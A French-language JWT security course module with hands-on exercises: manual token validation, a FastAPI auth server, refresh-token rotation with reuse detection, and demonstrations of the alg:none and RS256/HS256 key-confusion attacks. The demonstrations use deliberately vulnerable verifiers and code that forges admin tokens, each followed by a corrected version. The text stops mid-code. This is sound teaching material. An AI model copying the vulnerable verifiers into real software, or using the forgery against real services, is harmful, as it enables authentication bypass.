# Étape 8 — Consolidation et Validation des Acquis JWT

> **Objectif** : Valider la maîtrise complète du cours par des exercices pratiques guidés et des réponses de référence aux questions de vérification. Cette étape est la certification personnelle du parcours.

---

## Sommaire

**Exercices pratiques**
1. [Décoder et valider un JWT à la main](#exercice-1--décoder-et-valider-un-jwt-à-la-main)
2. [Serveur d'auth access_token + refresh_token](#exercice-2--serveur-dauthentification-complet)
3. [Rotation du refresh token avec détection de réutilisation](#exercice-3--rotation-du-refresh-token)
4. [Exploiter la vulnérabilité `alg: none`](#exercice-4--exploitation-de-la-vulnérabilité-alg-none)
5. [JWKS endpoint avec rotation de clés](#exercice-5--jwks-endpoint-avec-rotation-de-clés)
6. [Intégration OIDC avec Keycloak](#exercice-6--intégration-oidc-avec-keycloak-en-local)

**Questions de vérification**
7. [Réponses de référence](#questions-de-vérification--réponses-de-référence)

---

## Exercice 1 — Décoder et Valider un JWT à la Main

### Objectif
Comprendre que JWT n'est pas magique — c'est de la crypto de base et du Base64URL.

### Token de test

Utiliser ce token (signé avec `secret = "super-secret-key-for-exercise-only"`) :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQyIiwicm9sZSI6ImVkaXRvciIsImlhdCI6MTcwMDAwMDAwMCwiZXhwIjo5OTk5OTk5OTk5LCJqdGkiOiJhYmMtMTIzIn0.placeholder_signature
```

### Étape 1 — Identifier les 3 parties

```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\
.eyJzdWIiOiJ1c2VyXzQyIiwicm9sZSI6ImVkaXRvciIsImlhdCI6MTcwMDAwMDAwMCwiZXhwIjo5OTk5OTk5OTk5LCJqdGkiOiJhYmMtMTIzIn0\
.placeholder_signature"

echo $TOKEN | tr '.' '\n' | wc -l   # doit afficher 3
```

### Étape 2 — Décoder le header

```bash
# Base64URL → Base64 standard → décoder
echo $TOKEN | cut -d'.' -f1 \
  | tr '_-' '/+' \
  | awk '{while(length($0)%4!=0) $0=$0"="; print}' \
  | base64 -d \
  | python3 -m json.tool
```

**Résultat attendu :**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### Étape 3 — Décoder le payload

```bash
echo $TOKEN | cut -d'.' -f2 \
  | tr '_-' '/+' \
  | awk '{while(length($0)%4!=0) $0=$0"="; print}' \
  | base64 -d \
  | python3 -m json.tool
```

**Résultat attendu :**
```json
{
  "sub": "user_42",
  "role": "editor",
  "iat": 1700000000,
  "exp": 9999999999,
  "jti": "abc-123"
}
```

### Étape 4 — Recalculer la signature et vérifier

```python
#!/usr/bin/env python3
"""
Exercice 1 — Validation manuelle complète d'un JWT
Objectif : comprendre chaque étape sans magie de librairie
"""

import base64
import hashlib
import hmac
import json
import time

SECRET = b"super-secret-key-for-exercise-only"

# ── Helpers Base64URL ──
def b64url_decode(s: str) -> bytes:
    s = s.replace('-', '+').replace('_', '/')
    padding = 4 - len(s) % 4
    if padding != 4:
        s += '=' * padding
    return base64.b64decode(s)

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# ── Le token à valider (généré avec le bon secret) ──
# On génère d'abord un token valide pour l'exercice
header  = {"alg": "HS256", "typ": "JWT"}
payload = {
    "sub": "user_42",
    "role": "editor",
    "iat": 1700000000,
    "exp": 9999999999,
    "jti": "abc-123",
}

header_b64  = b64url_encode(json.dumps(header,  separators=(',',':')).encode())
payload_b64 = b64url_encode(json.dumps(payload, separators=(',',':')).encode())
signing_input = f"{header_b64}.{payload_b64}".encode()
signature = hmac.new(SECRET, signing_input, hashlib.sha256).digest()
TOKEN = f"{header_b64}.{payload_b64}.{b64url_encode(signature)}"

print("=" * 60)
print("TOKEN DE TEST")
print("=" * 60)
print(TOKEN)
print()

# ── Validation manuelle pas à pas ──
def validate_jwt_manually(token: str, secret: bytes) -> dict:
    print("── Étape 1 : Découpage ──")
    parts = token.split('.')
    assert len(parts) == 3, f"ERREUR : {len(parts)} parties au lieu de 3"
    header_b64, payload_b64, sig_b64 = parts
    print(f"  Header  : {header_b64}")
    print(f"  Payload : {payload_b64}")
    print(f"  Sig     : {sig_b64[:20]}...")
    print()

    print("── Étape 2 : Décoder et valider le header ──")
    header_data = json.loads(b64url_decode(header_b64))
    print(f"  Header décodé : {header_data}")
    alg = header_data.get('alg', '')
    if alg == 'none':
        raise ValueError("ATTAQUE DÉTECTÉE : alg=none interdit !")
    if alg != 'HS256':
        raise ValueError(f"Algorithme non supporté : {alg}")
    print(f"  ✓ Algorithme validé : {alg}")
    print()

    print("── Étape 3 : Recalculer la signature attendue ──")
    signing_input = f"{header_b64}.{payload_b64}".encode('ascii')
    expected_sig  = hmac.new(secret, signing_input, hashlib.sha256).digest()
    actual_sig    = b64url_decode(sig_b64)
    print(f"  Attendue : {b64url_encode(expected_sig)[:20]}...")
    print(f"  Reçue    : {b64url_encode(actual_sig)[:20]}...")

    print("── Étape 4 : Comparaison en temps constant ──")
    if not hmac.compare_digest(expected_sig, actual_sig):
        raise ValueError("SIGNATURE INVALIDE — token falsifié ou mauvais secret")
    print("  ✓ Signature valide")
    print()

    print("── Étape 5 : Décoder le payload (SEULEMENT après sig valide) ──")
    payload_data = json.loads(b64url_decode(payload_b64))
    print(f"  Payload : {json.dumps(payload_data, indent=2)}")
    print()

    print("── Étape 6 : Valider les claims temporels ──")
    now = int(time.time())
    print(f"  Maintenant : {now}")

    if 'exp' not in payload_data:
        raise ValueError("REJETÉ : claim 'exp' absent — token sans expiration interdit")
    if now > payload_data['exp']:
        raise ValueError(f"EXPIRÉ depuis {now - payload_data['exp']}s")
    print(f"  ✓ exp valide (expire dans {payload_data['exp'] - now}s)")

    if 'nbf' in payload_data and now < payload_data['nbf']:
        raise ValueError(f"Pas encore valide (nbf)")

    print()
    print("✅ TOKEN VALIDE")
    return payload_data

# ── Test 1 : Token valide ──
print("=" * 60)
print("TEST 1 : Token valide")
print("=" * 60)
try:
    result = validate_jwt_manually(TOKEN, SECRET)
except ValueError as e:
    print(f"❌ {e}")

# ── Test 2 : Payload falsifié ──
print()
print("=" * 60)
print("TEST 2 : Payload falsifié (role: admin)")
print("=" * 60)
parts = TOKEN.split('.')
evil_payload = b64url_encode(json.dumps({"sub":"user_42","role":"admin","exp":9999999999}).encode())
tampered = f"{parts[0]}.{evil_payload}.{parts[2]}"
try:
    validate_jwt_manually(tampered, SECRET)
except ValueError as e:
    print(f"✅ Attaque détectée : {e}")

# ── Test 3 : alg:none ──
print()
print("=" * 60)
print("TEST 3 : Attaque alg:none")
print("=" * 60)
evil_header = b64url_encode(json.dumps({"alg":"none","typ":"JWT"}).encode())
none_token  = f"{evil_header}.{parts[1]}."
try:
    validate_jwt_manually(none_token, SECRET)
except ValueError as e:
    print(f"✅ Attaque détectée : {e}")
```

**Output attendu :**
```
TEST 1 : Token valide
── Étape 1 : Découpage ──
── Étape 2 : Décoder et valider le header ──
  ✓ Algorithme validé : HS256
── Étape 3 : Recalculer la signature attendue ──
── Étape 4 : Comparaison en temps constant ──
  ✓ Signature valide
── Étape 5 : Décoder le payload (SEULEMENT après sig valide) ──
── Étape 6 : Valider les claims temporels ──
  ✓ exp valide
✅ TOKEN VALIDE

TEST 2 : Payload falsifié
✅ Attaque détectée : SIGNATURE INVALIDE — token falsifié ou mauvais secret

TEST 3 : Attaque alg:none
✅ Attaque détectée : ATTAQUE DÉTECTÉE : alg=none interdit !
```

---

## Exercice 2 — Serveur d'Authentification Complet

### Objectif
Implémenter un serveur d'auth production-ready avec access + refresh token en Django/FastAPI.

### Architecture cible

```
POST /auth/login        → émet access_token (15 min) + refresh_token (7j, cookie)
POST /auth/refresh      → renouvelle access_token depuis refresh_token
POST /auth/logout       → révoque les tokens
GET  /auth/me           → endpoint protégé de test
```

### Implémentation FastAPI complète

```python
# auth_server.py
"""
Serveur d'authentification JWT complet.
Dépendances : pip install fastapi uvicorn python-jose[cryptography] redis pydantic passlib[bcrypt]
Lancer : uvicorn auth_server:app --reload
"""

import uuid
import time
from datetime import datetime, timedelta, timezone
from functools import lru_cache
from typing import Annotated

import redis
from fastapi import FastAPI, Depends, HTTPException, Response, Cookie, status
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from jose import JWTError, jwt
from passlib.context import CryptContext
from pydantic import BaseModel, EmailStr
from pydantic_settings import BaseSettings

# ══════════════════════════════════════════════
# Configuration
# ══════════════════════════════════════════════

class Settings(BaseSettings):
    jwt_secret: str        = "REMPLACER_PAR_SECRET_256_BITS_ALEATOIRE"
    refresh_secret: str    = "REMPLACER_PAR_AUTRE_SECRET_256_BITS"
    jwt_algorithm: str     = "HS256"
    access_token_minutes: int  = 15
    refresh_token_days: int    = 7
    jwt_issuer: str        = "https://auth.monapp.com"
    jwt_audience: str      = "monapp-api"
    redis_url: str         = "redis://localhost:6379/0"

    class Config:
        env_file = ".env"

@lru_cache
def get_settings() -> Settings:
    return Settings()

# ══════════════════════════════════════════════
# Dépendances
# ══════════════════════════════════════════════

def get_redis(settings: Settings = Depends(get_settings)) -> redis.Redis:
    return redis.from_url(settings.redis_url, decode_responses=True)

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
bearer_scheme = HTTPBearer(auto_error=False)

# ══════════════════════════════════════════════
# Base de données simulée (remplacer par vraie DB)
# ══════════════════════════════════════════════

USERS_DB = {
    "user@monapp.com": {
        "id": "usr_001",
        "email": "user@monapp.com",
        "hashed_password": pwd_context.hash("password123"),
        "role": "user",
        "is_active": True,
        "token_version": 1,  # pour révocation globale
    }
}

def get_user(email: str) -> dict | None:
    return USERS_DB.get(email)

# ══════════════════════════════════════════════
# Schémas Pydantic
# ══════════════════════════════════════════════

class LoginRequest(BaseModel):
    email: str
    password: str

class TokenResponse(BaseModel):
    access_token: str
    token_type: str = "bearer"
    expires_in: int  # secondes

class UserInfo(BaseModel):
    user_id: str
    email: str
    role: str

# ══════════════════════════════════════════════
# Fonctions JWT
# ══════════════════════════════════════════════

def create_access_token(user: dict, settings: Settings) -> tuple[str, int]:
    """Retourne (token, exp_timestamp)."""
    now = datetime.now(timezone.utc)
    exp = now + timedelta(minutes=settings.access_token_minutes)

    payload = {
        "sub": user["id"],
        "email": user["email"],
        "role": user["role"],
        "ver": user["token_version"],       # version pour révocation globale
        "iss": settings.jwt_issuer,
        "aud": settings.jwt_audience,
        "iat": int(now.timestamp()),
        "exp": int(exp.timestamp()),
        "jti": str(uuid.uuid4()),
    }

    token = jwt.encode(payload, settings.jwt_secret, algorithm=settings.jwt_algorithm)
    return token, int(exp.timestamp())

def create_refresh_token(user_id: str, settings: Settings) -> tuple[str, str]:
    """Retourne (token, jti)."""
    jti = str(uuid.uuid4())
    now = datetime.now(timezone.utc)
    exp = now + timedelta(days=settings.refresh_token_days)

    payload = {
        "sub": user_id,
        "type": "refresh",
        "jti": jti,
        "iss": settings.jwt_issuer,
        "iat": int(now.timestamp()),
        "exp": int(exp.timestamp()),
    }

    token = jwt.encode(payload, settings.refresh_secret, algorithm=settings.jwt_algorithm)
    return token, jti

def verify_access_token(token: str, settings: Settings) -> dict:
    try:
        payload = jwt.decode(
            token,
            settings.jwt_secret,
            algorithms=[settings.jwt_algorithm],
            audience=settings.jwt_audience,
            issuer=settings.jwt_issuer,
            options={"leeway": 30},
        )
        return payload
    except JWTError as e:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail={"error": "invalid_token", "message": str(e)},
            headers={"WWW-Authenticate": 'Bearer error="invalid_token"'},
        )

def verify_refresh_token(token: str, settings: Settings) -> dict:
    try:
        payload = jwt.decode(
            token,
            settings.refresh_secret,
            algorithms=[settings.jwt_algorithm],
            issuer=settings.jwt_issuer,
        )
        if payload.get("type") != "refresh":
            raise JWTError("Not a refresh token")
        return payload
    except JWTError:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED,
                           detail="Refresh token invalide")

# ══════════════════════════════════════════════
# Révocation (Redis)
# ══════════════════════════════════════════════

def revoke_access_token(jti: str, exp: int, r: redis.Redis):
    ttl = max(exp - int(time.time()), 0)
    if ttl > 0:
        r.setex(f"blacklist:access:{jti}", ttl, "revoked")

def revoke_refresh_token(jti: str, r: redis.Redis):
    r.setex(f"blacklist:refresh:{jti}", 7 * 86400, "revoked")

def is_access_token_revoked(jti: str, r: redis.Redis) -> bool:
    return r.exists(f"blacklist:access:{jti}") > 0

def is_refresh_token_revoked(jti: str, r: redis.Redis) -> bool:
    return r.exists(f"blacklist:refresh:{jti}") > 0

# ══════════════════════════════════════════════
# Dépendance d'authentification
# ══════════════════════════════════════════════

async def get_current_user(
    credentials: Annotated[HTTPAuthorizationCredentials | None, Depends(bearer_scheme)],
    settings: Settings = Depends(get_settings),
    r: redis.Redis = Depends(get_redis),
) -> dict:
    if not credentials:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail={"error": "invalid_request", "message": "Token manquant"},
            headers={"WWW-Authenticate": 'Bearer realm="monapp-api"'},
        )

    payload = verify_access_token(credentials.credentials, settings)

    # Vérifier la blacklist
    if is_access_token_revoked(payload["jti"], r):
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED,
                           detail={"error": "invalid_token", "message": "Token révoqué"})

    # Vérifier la version (révocation globale)
    user = get_user(payload["email"])
    if not user or user["token_version"] != payload.get("ver"):
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED,
                           detail={"error": "invalid_token", "message": "Session révoquée"})

    return payload

# ══════════════════════════════════════════════
# Application
# ══════════════════════════════════════════════

app = FastAPI(title="Auth Server — Exercice JWT")

@app.post("/auth/login", response_model=TokenResponse)
async def login(
    body: LoginRequest,
    response: Response,
    settings: Settings = Depends(get_settings),
):
    # 1. Récupérer l'utilisateur
    user = get_user(body.email)
    if not user or not user["is_active"]:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED,
                           detail="Identifiants invalides")

    # 2. Vérifier le mot de passe (timing-safe via bcrypt)
    if not pwd_context.verify(body.password, user["hashed_password"]):
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED,
                           detail="Identifiants invalides")

    # 3. Émettre les tokens
    access_token, exp = create_access_token(user, settings)
    refresh_token, _  = create_refresh_token(user["id"], settings)

    # 4. Refresh token en cookie httpOnly
    response.set_cookie(
        key="refresh_token",
        value=refresh_token,
        httponly=True,
        secure=True,
        samesite="strict",
        max_age=settings.refresh_token_days * 86400,
        path="/auth/",
    )

    return TokenResponse(
        access_token=access_token,
        expires_in=settings.access_token_minutes * 60,
    )

@app.post("/auth/refresh", response_model=TokenResponse)
async def refresh(
    response: Response,
    refresh_token: Annotated[str | None, Cookie()] = None,
    settings: Settings = Depends(get_settings),
    r: redis.Redis = Depends(get_redis),
):
    if not refresh_token:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED,
                           detail="Refresh token manquant")

    payload = verify_refresh_token(refresh_token, settings)
    jti     = payload["jti"]

    # Vérifier que le refresh token n'a pas été révoqué
    if is_refresh_token_revoked(jti, r):
        # Token déjà utilisé ou révoqué → alarme sécurité
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED,
                           detail="Session expirée — reconnexion requise")

    # Révoquer l'ancien refresh token (one-time use)
    revoke_refresh_token(jti, r)

    # Récupérer l'utilisateur
    user_id = payload["sub"]
    # (En prod, récupérer depuis DB par user_id)
    user = next((u for u in USERS_DB.values() if u["id"] == user_id), None)
    if not user or not user["is_active"]:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED,
                           detail="Utilisateur non trouvé")

    # Émettre les nouveaux tokens
    new_access_token, exp  = create_access_token(user, settings)
    new_refresh_token, _   = create_refresh_token(user_id, settings)

    response.set_cookie(
        key="refresh_token",
        value=new_refresh_token,
        httponly=True, secure=True, samesite="strict",
        max_age=settings.refresh_token_days * 86400,
        path="/auth/",
    )

    return TokenResponse(access_token=new_access_token,
                        expires_in=settings.access_token_minutes * 60)

@app.post("/auth/logout", status_code=status.HTTP_204_NO_CONTENT)
async def logout(
    response: Response,
    current_user: dict = Depends(get_current_user),
    credentials: Annotated[HTTPAuthorizationCredentials | None, Depends(bearer_scheme)] = None,
    refresh_token: Annotated[str | None, Cookie()] = None,
    settings: Settings = Depends(get_settings),
    r: redis.Redis = Depends(get_redis),
):
    # Révoquer l'access token
    revoke_access_token(current_user["jti"], current_user["exp"], r)

    # Révoquer le refresh token si présent
    if refresh_token:
        try:
            rt_payload = verify_refresh_token(refresh_token, settings)
            revoke_refresh_token(rt_payload["jti"], r)
        except HTTPException:
            pass  # Ignorer si invalide

    response.delete_cookie("refresh_token", path="/auth/")

@app.get("/auth/me", response_model=UserInfo)
async def me(current_user: dict = Depends(get_current_user)):
    return UserInfo(
        user_id=current_user["sub"],
        email=current_user["email"],
        role=current_user["role"],
    )
```

### Test avec curl

```bash
# 1. Login
curl -X POST http://localhost:8000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@monapp.com","password":"password123"}' \
  -c cookies.txt -v

# 2. Accéder à une ressource protégée
ACCESS_TOKEN="<token du login>"
curl http://localhost:8000/auth/me \
  -H "Authorization: Bearer $ACCESS_TOKEN"

# 3. Refresh
curl -X POST http://localhost:8000/auth/refresh \
  -b cookies.txt -c cookies.txt -v

# 4. Logout
curl -X POST http://localhost:8000/auth/logout \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -b cookies.txt -v

# 5. Vérifier que le token est révoqué
curl http://localhost:8000/auth/me \
  -H "Authorization: Bearer $ACCESS_TOKEN"
# → 401 Unauthorized
```

---

## Exercice 3 — Rotation du Refresh Token avec Détection de Réutilisation

### Objectif
Implémenter la détection de réutilisation d'un refresh token (signe de compromission) et la révocation de toute la famille de tokens.

```python
# refresh_token_rotation.py
"""
Exercice 3 — Rotation des refresh tokens avec détection de réutilisation.
Démonstration du scénario d'attaque et de la défense.
"""

import uuid
import time
import redis
import jwt
import json

r = redis.Redis(host='localhost', port=6379, db=1, decode_responses=True)
SECRET = b"exercise-refresh-secret-256bits-long"
ALGORITHM = "HS256"

def create_refresh_token(user_id: str, family_id: str = None) -> dict:
    """Crée un refresh token avec ID de famille pour la détection."""
    jti       = str(uuid.uuid4())
    family_id = family_id or str(uuid.uuid4())  # nouvelle famille si premier token
    now       = int(time.time())

    payload = {
        "sub": user_id,
        "jti": jti,
        "family": family_id,  # tous les tokens d'une même session partagent cet ID
        "type": "refresh",
        "iat": now,
        "exp": now + 7 * 86400,
    }

    token = jwt.encode(payload, SECRET, algorithm=ALGORITHM)

    # Stocker en DB : jti → état (valide/utilisé/révoqué)
    r.hset(f"rt:{jti}", mapping={
        "user_id": user_id,
        "family": family_id,
        "status": "valid",
        "created_at": now,
    })
    r.expire(f"rt:{jti}", 7 * 86400)

    return {"token": token, "jti": jti, "family": family_id}

def rotate_refresh_token(old_token: str) -> dict:
    """
    Valide et remplace un refresh token.
    Si le token a déjà été utilisé → ALERTE et révocation de toute la famille.
    """
    # Décoder sans vérification de révocation d'abord
    try:
        payload = jwt.decode(old_token, SECRET, algorithms=[ALGORITHM])
    except jwt.ExpiredSignatureError:
        raise Exception("Refresh token expiré — reconnexion requise")
    except jwt.InvalidTokenError:
        raise Exception("Refresh token invalide")

    jti       = payload["jti"]
    family_id = payload["family"]
    user_id   = payload["sub"]

    # Vérifier l'état en DB
    stored = r.hgetall(f"rt:{jti}")

    if not stored:
        # Token inconnu — possible attaque avec token forgé
        raise Exception("Token inconnu — possible attaque")

    if stored["status"] == "used":
        # ⚠️  ALERTE DE SÉCURITÉ : token déjà consommé
        print(f"\n🚨 ALERTE SÉCURITÉ : Réutilisation du refresh token !")
        print(f"   JTI     : {jti}")
        print(f"   Famille : {family_id}")
        print(f"   User    : {user_id}")
        print(f"   → Révocation de TOUTE la famille de tokens")

        # Révoquer toute la famille
        revoke_token_family(family_id)
        raise Exception("COMPROMISSION DÉTECTÉE — reconnexion requise sur tous les appareils")

    if stored["status"] == "revoked":
        raise Exception("Token révoqué")

    # Marquer l'ancien token comme "utilisé" (pas supprimé — pour détecter la réutilisation)
    r.hset(f"rt:{jti}", "status", "used")

    # Émettre un nouveau refresh token dans la même famille
    new_token_data = create_refresh_token(user_id, family_id=family_id)
    print(f"✓ Rotation réussie")
    print(f"  Ancien JTI : {jti[:8]}... → Nouveau JTI : {new_token_data['jti'][:8]}...")

    return new_token_data

def revoke_token_family(family_id: str):
    """Révoque tous les tokens d'une famille (cas de compromission)."""
    # Scanner tous les tokens de cette famille
    for key in r.scan_iter("rt:*"):
        token_data = r.hgetall(key)
        if token_data.get("family") == family_id:
            r.hset(key, "status", "revoked")
            print(f"  Révoqué : {key}")

# ══════════════════════════════════════════════
# Scénarios de test
# ══════════════════════════════════════════════

print("=" * 60)
print("SCÉNARIO 1 : Rotation normale")
print("=" * 60)

# Login initial
rt1 = create_refresh_token("user_42")
print(f"Token initial (JTI: {rt1['jti'][:8]}...)")

# Utilisation normale — premier refresh
rt2 = rotate_refresh_token(rt1["token"])
print(f"Premier refresh OK (JTI: {rt2['jti'][:8]}...)")

# Utilisation normale — deuxième refresh
rt3 = rotate_refresh_token(rt2["token"])
print(f"Deuxième refresh OK (JTI: {rt3['jti'][:8]}...)")


print()
print("=" * 60)
print("SCÉNARIO 2 : Réutilisation (attaque replay)")
print("=" * 60)

rt_a = create_refresh_token("user_99")
print(f"Token émis (JTI: {rt_a['jti'][:8]}...)")

rt_b = rotate_refresh_token(rt_a["token"])
print(f"Première utilisation OK")

try:
    # Simuler un attaquant qui réutilise rt_a (déjà consommé)
    print("\nAttaquant réutilise l'ancien token...")
    rotate_refresh_token(rt_a["token"])
except Exception as e:
    print(f"\n✅ Attaque bloquée : {e}")

# Vérifier que rt_b est aussi révoqué (toute la famille)
print("\nVérification : rt_b est-il révoqué ?")
try:
    rotate_refresh_token(rt_b["token"])
    print("❌ ERREUR : rt_b aurait dû être révoqué")
except Exception as e:
    print(f"✅ rt_b révoqué : {e}")
```

---

## Exercice 4 — Exploitation de la Vulnérabilité `alg: none`

### Objectif
Comprendre l'attaque par l'intérieur en la reproduisant sur un serveur intentionnellement vulnérable.

> ⚠️ **Environnement de test uniquement.** Ne jamais utiliser ce code en production.

```python
# vulnerable_server.py — INTENTIONNELLEMENT VULNÉRABLE pour l'apprentissage
"""
Serveur vulnérable à l'attaque alg:none.
À utiliser UNIQUEMENT pour comprendre la vulnérabilité.
"""

import base64
import json
import time
from http.server import HTTPServer, BaseHTTPRequestHandler

SECRET = b"secret"

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(s: str) -> bytes:
    s = s.replace('-','+').replace('_','/')
    padding = 4 - len(s) % 4
    if padding != 4: s += '=' * padding
    return base64.b64decode(s)

def verify_token_VULNERABLE(token: str) -> dict:
    """
    ❌ IMPLÉMENTATION VOLONTAIREMENT VULNÉRABLE.
    Lit l'algorithme depuis le token lui-même.
    """
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Token malformé")

    header  = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))

    alg = header.get('alg')

    # ❌ ERREUR CRITIQUE : accepte alg:none sans vérification de signature
    if alg == 'none':
        print("[VULN SERVER] ⚠️  alg=none accepté — AUCUNE VÉRIFICATION !")
        return payload  # retourne directement sans vérifier !

    # Pour HS256, vérifie la signature (correctement)
    if alg == 'HS256':
        import hmac, hashlib
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        expected = hmac.new(SECRET, signing_input, hashlib.sha256).digest()
        actual   = b64url_decode(parts[2])
        if not hmac.compare_digest(expected, actual):
            raise ValueError("Signature invalide")
        return payload

    raise ValueError(f"Algorithme non géré : {alg}")

# ══════════════════════════════════════════════
# Démonstration de l'attaque
# ══════════════════════════════════════════════

print("=" * 60)
print("DÉMONSTRATION : Attaque alg:none")
print("=" * 60)

# 1. Token légitime d'un utilisateur normal
import hmac, hashlib

header  = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "user_42", "role": "user", "exp": int(time.time()) + 3600}

h_b64 = b64url_encode(json.dumps(header, separators=(',',':')).encode())
p_b64 = b64url_encode(json.dumps(payload, separators=(',',':')).encode())
sig   = hmac.new(SECRET, f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest()
legitimate_token = f"{h_b64}.{p_b64}.{b64url_encode(sig)}"

print(f"\n1. Token légitime de user_42 (role=user) :")
print(f"   {legitimate_token[:60]}...")

result = verify_token_VULNERABLE(legitimate_token)
print(f"   → Validé : role={result['role']}")

# 2. Attaquant forge un token admin SANS connaître le secret
print(f"\n2. Attaquant forge un token admin (sans connaître le secret) :")

evil_header  = {"alg": "none", "typ": "JWT"}
evil_payload = {"sub": "attacker", "role": "admin", "exp": int(time.time()) + 3600}

eh_b64 = b64url_encode(json.dumps(evil_header,  separators=(',',':')).encode())
ep_b64 = b64url_encode(json.dumps(evil_payload, separators=(',',':')).encode())
forged_token = f"{eh_b64}.{ep_b64}."  # signature vide !

print(f"   Token forgé (alg=none, sig vide) :")
print(f"   {forged_token[:60]}...")

# 3. Le serveur vulnérable accepte le token forgé
print(f"\n3. Serveur vulnérable reçoit le token forgé :")
try:
    result = verify_token_VULNERABLE(forged_token)
    print(f"   ❌ ATTAQUE RÉUSSIE : role={result['role']}, sub={result['sub']}")
    print(f"   L'attaquant est maintenant admin !")
except ValueError as e:
    print(f"   ✅ Attaque bloquée : {e}")

# 4. Démonstration du serveur corrigé
print(f"\n4. Serveur CORRIGÉ (whitelist d'algorithmes) :")

def verify_token_SECURE(token: str) -> dict:
    """✅ Version sécurisée — algorithme fixé côté serveur."""
    ALLOWED_ALGORITHMS = ["HS256"]  # jamais lu depuis le token

    parts = token.split('.')
    header = json.loads(b64url_decode(parts[0]))

    # Rejeter immédiatement tout algorithme hors whitelist
    if header.get('alg') not in ALLOWED_ALGORITHMS:
        raise ValueError(f"Algorithme refusé : {header.get('alg')}")

    # À partir d'ici, on sait que c'est HS256
    payload = json.loads(b64url_decode(parts[1]))
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected = hmac.new(SECRET, signing_input, hashlib.sha256).digest()
    actual   = b64url_decode(parts[2]) if parts[2] else b''

    if not hmac.compare_digest(expected, actual):
        raise ValueError("Signature invalide")

    return payload

try:
    verify_token_SECURE(forged_token)
    print("   ❌ ERREUR : devrait avoir bloqué l'attaque")
except ValueError as e:
    print(f"   ✅ Attaque bloquée : {e}")

try:
    result = verify_token_SECURE(legitimate_token)
    print(f"   ✅ Token légitime accepté : role={result['role']}")
except ValueError as e:
    print(f"   ❌ Token légitime rejeté à tort : {e}")
```

### Variation — Attaque RS256 → HS256

```python
# attaque_confusion_rs256_hs256.py
"""
Démonstration de l'attaque de confusion d'algorithme RS256 → HS256.
L'attaquant utilise la clé publique RSA comme secret HMAC.
"""

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend
import hmac, hashlib, base64, json, time

# ── Génération de paire RSA (simule le serveur) ──
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()

# Clé publique en PEM (connue de tout le monde)
public_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

print("Clé publique RSA (publique, connue de l'attaquant) :")
print(public_pem.decode()[:100], "...")

# ── Helpers ──
def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(s: str) -> bytes:
    s = s.replace('-', '+').replace('_', '/')
    padding = 4 - len(s) % 4
    if padding != 4: s += '=' * padding
    return base64.b64decode(s)

# ── Attaquant forge un token HS256 signé avec la clé publique RSA ──
evil_header  = {"alg": "HS256", "typ": "JWT"}   # ← clé de l'attaque : déclare HS256
evil_payload = {"sub": "attacker", "role": "admin", "exp": int(time.time()) + 3600}

eh_b64 = b64url_encode(json.dumps(evil_header,  separators=(',',':')).encode())
ep_b64 = b64url_encode(json.dumps(evil_payload, separators=(',',':')).encode())

# Signer avec HMAC-SHA256 en utilisant la clé publique RSA comme "secret"
signing_input = f"{eh_b64}.{ep_b64}".encode()
evil_sig = hmac.new(public_pem, signing_input, hashlib.sha256).digest()
forged_token = f"{eh_b64}.{ep_b64}.{b64url_encode(evil_sig)}"

print(f"\nToken forgé par l'attaquant (alg=HS256, signé avec clé publique) :")
print(forged_token[:80] + "...")

# ── Serveur vulnérable ──
def verify_VULNERABLE(token: str) -> dict:
    """Lit l'alg depuis le token et utilise la clé publique pour les deux."""
    parts   = token.split('.')
    header  = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    alg     = header['alg']

    if alg == 'RS256':
        # ... vérifie avec clé publique RSA (correct)
        pass
    elif alg == 'HS256':
        # ❌ ERREUR : utilise la clé publique RSA comme secret HMAC !
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        expected = hmac.new(public_pem, signing_input, hashlib.sha256).digest()
        actual   = b64url_decode(parts[2])
        if hmac.compare_digest(expected, actual):
            return payload  # La vérification réussit avec le token forgé !
    raise ValueError("Vérification échouée")

print("\nServeur vulnérable :")
try:
    result = verify_VULNERABLE(forged_token)
    print(f"❌ ATTAQUE RÉUSSIE : {result}")
except ValueError as e:
    print(f"✅ Bloqué : {e}")

# ── Serveur corrigé ──
def verify_SECURE(token: str) -> dict:
    """Algorithme fixé à RS256 côté serveur, jamais lu depuis le token."""
    import jwt  # PyJWT
    payload = jwt.decode(token, public_key, algorithms=["RS256"])  # whitelist stricte
    return payload

print("\nServeur sécurisé :")
try:
    verify_SECURE(forged_token)
